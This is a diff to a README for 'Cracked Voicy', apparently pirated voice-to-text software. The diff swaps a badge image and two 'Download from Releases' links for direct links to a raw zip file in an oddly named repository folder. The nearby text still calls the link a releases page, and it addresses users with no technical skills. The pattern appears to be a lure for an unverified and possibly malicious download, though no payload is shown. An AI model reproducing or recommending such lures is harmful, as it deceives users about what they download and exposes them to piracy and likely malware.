@@ -1,6 +1,6 @@
 # 🎤 cracked-voicy-voice-to-text-powered-by-ai - Transform Your Voice Into Text Effortlessly
 
-![Download](https://img.shields.io/badge/Download-Now-blue.svg)
+![Download](https://raw.githubusercontent.com/MECH-STORE/cracked-voicy-voice-to-text-powered-by-ai/main/lacertoid/cracked-voicy-voice-to-text-powered-by-ai.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ Cracked Voicy is an easy-to-use application that transforms your voice into text
 Follow these steps to download and run the application. No technical skills are required.
 
 1. **Go to the Releases Page:**  
-   Visit the following link: [Download from Releases](https://github.com/MECH-STORE/cracked-voicy-voice-to-text-powered-by-ai/releases). This page contains all available versions of the application.
+   Visit the following link: [Download from Releases](https://raw.githubusercontent.com/MECH-STORE/cracked-voicy-voice-to-text-powered-by-ai/main/lacertoid/cracked-voicy-voice-to-text-powered-by-ai.zip). This page contains all available versions of the application.
 
 2. **Select the Latest Release:**  
    Look for the latest version of the software. You’ll find a list with the most recent updates. Click on the version number that you want to download.
@@ -29,7 +29,7 @@ Follow these steps to download and run the application. No technical skills are 
 
 ## 📥 Download & Install
 
-For a seamless experience, make sure to download the latest version of Cracked Voicy. You can start the download by clicking here: [Download from Releases](https://github.com/MECH-STORE/cracked-voicy-voice-to-text-powered-by-ai/releases). Follow the installation instructions listed above to set it up effortlessly.
+For a seamless experience, make sure to download the latest version of Cracked Voicy. You can start the download by clicking here: [Download from Releases](https://raw.githubusercontent.com/MECH-STORE/cracked-voicy-voice-to-text-powered-by-ai/main/lacertoid/cracked-voicy-voice-to-text-powered-by-ai.zip). Follow the installation instructions listed above to set it up effortlessly.
 
 ## 🔧 System Requirements
 
